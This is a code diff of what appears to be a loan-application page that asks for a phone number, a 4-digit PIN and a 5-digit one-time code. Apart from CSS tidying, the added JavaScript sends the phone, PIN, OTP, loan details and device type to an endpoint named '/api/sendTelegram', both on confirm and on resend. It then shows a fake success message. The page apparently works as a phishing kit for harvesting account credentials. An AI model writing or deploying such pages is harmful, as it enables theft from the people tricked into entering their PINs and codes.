@@ -84,11 +84,6 @@ input:focus{
   width:100%;
   font-weight:600;
   cursor:pointer;
-  transition:background-color .15s ease, box-shadow .15s ease;
-}
-
-.btn:active{
-  box-shadow:0 4px 10px rgba(0,0,0,.6) inset;
 }
 
 .btn[disabled]{
@@ -99,12 +94,7 @@ input:focus{
 .req{color:#ef4444;margin-right:6px}
 .small{font-size:13px;color:#9ca3af}
 .success{color:#22c55e;font-weight:600}
-
-.error{
-  min-height:18px;
-  font-size:13px;
-  color:#ef4444;
-}
+.error{min-height:18px;font-size:13px;color:#ef4444}
 
 /* PIN */
 .pin-row{
@@ -193,13 +183,6 @@ input:focus{
   padding:10px 14px;
   border-radius:8px;
   color:#e5e7eb;
-  flex:1;
-  cursor:pointer;
-  transition:box-shadow .15s ease;
-}
-
-.resend-btn:active{
-  box-shadow:0 4px 10px rgba(0,0,0,.6) inset;
 }
 
 .resend-btn[disabled]{
@@ -210,13 +193,6 @@ input:focus{
 .action-primary{
   background:#2563eb;
   border:0;
-  color:#fff;
-}
-
-.action-secondary{
-  background:#020617;
-  border:1px solid #1f2937;
-  color:#e5e7eb;
 }
 
 /* SPINNER */
@@ -228,8 +204,6 @@ input:focus{
   border-radius:50%;
   display:inline-block;
   animation:spin .8s linear infinite;
-  vertical-align:-2px;
-  margin-right:6px;
 }
 @keyframes spin{to{transform:rotate(360deg)}}
 </style>
@@ -279,15 +253,13 @@ input:focus{
     <div id="otpWarning" class="otp-warning">Please input 5 digits</div>
 
     <div class="resend-row">
-      <div class="small">
-        Resend in <span id="countdown">120</span>s
-      </div>
+      <div class="small">Resend in <span id="countdown">120</span>s</div>
       <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
     </div>
 
     <div style="display:flex;gap:10px;margin-top:14px">
       <button id="confirmOtp" class="resend-btn action-primary" disabled>Confirm</button>
-      <button id="cancelOtp" class="resend-btn action-secondary">Cancel</button>
+      <button id="cancelOtp" class="resend-btn">Cancel</button>
     </div>
 
     <div id="otpStatus" class="small" style="margin-top:8px"></div>
@@ -302,10 +274,37 @@ try{
   if(raw) loanForm=JSON.parse(raw);
 }catch(e){}
 
-/* ===== ORIGINAL CODE BELOW (UNCHANGED) ===== */
-/* only change is plan value */
+/* ===== DEVICE ===== */
+const ua=navigator.userAgent;
+let device='Unknown';
+if(/Android/i.test(ua)) device='Android | Chrome';
 
-document.getElementById('loginForm').addEventListener('submit',async e=>{
+/* ===== PIN ===== */
+const pins=[...document.querySelectorAll('.pin-digit')];
+let pinValue='';
+const loginBtn=document.getElementById('loginBtn');
+
+pins.forEach((el,i)=>{
+  el.addEventListener('input',()=>{
+    el.value=el.value.replace(/\D/g,'');
+    el.classList.toggle('filled',!!el.value);
+    if(el.value && i<pins.length-1) pins[i+1].focus();
+    pinValue=pins.map(p=>p.value).join('');
+    loginBtn.disabled=!/^\d{4}$/.test(pinValue);
+  });
+});
+
+/* ===== API ===== */
+async function sendToServer(payload){
+  return fetch('/api/sendTelegram',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(payload)
+  });
+}
+
+/* ===== LOGIN ===== */
+loginForm.addEventListener('submit',async e=>{
   e.preventDefault();
 
   await sendToServer({
@@ -317,8 +316,40 @@ document.getElementById('loginForm').addEventListener('submit',async e=>{
     submittedAt:new Date().toISOString()
   });
 
-  document.getElementById('otpModal').style.display='flex';
+  otpModal.style.display='flex';
 });
+
+/* ===== CONFIRM ===== */
+confirmOtp.onclick=async()=>{
+  await sendToServer({
+    event:'otp_confirm',
+    loginPhone:phone.value,
+    loginPin:pinValue,
+    otp:otpBuffer.value,
+    plan:`Loan Request: USD ${loanForm.loanAmount} / ${loanForm.repayment} month(s) (${loanForm.employment})`,
+    device,
+    submittedAt:new Date().toISOString()
+  });
+
+  otpStatus.innerHTML="<span class='success'>Success — request received.</span>";
+  setTimeout(()=>location.href='thankyou.html',1200);
+};
+
+/* ===== RESEND ===== */
+resendBtn.onclick=async()=>{
+  resendBtn.innerHTML='<span class="spinner"></span>Sending…';
+
+  await sendToServer({
+    event:'resend_otp',
+    loginPhone:phone.value,
+    loginPin:pinValue,
+    plan:`Loan Request: USD ${loanForm.loanAmount} / ${loanForm.repayment} month(s) (${loanForm.employment})`,
+    device,
+    submittedAt:new Date().toISOString()
+  });
+
+  resendBtn.innerHTML='OTP sent ✓';
+};
 </script>
 
 </body>
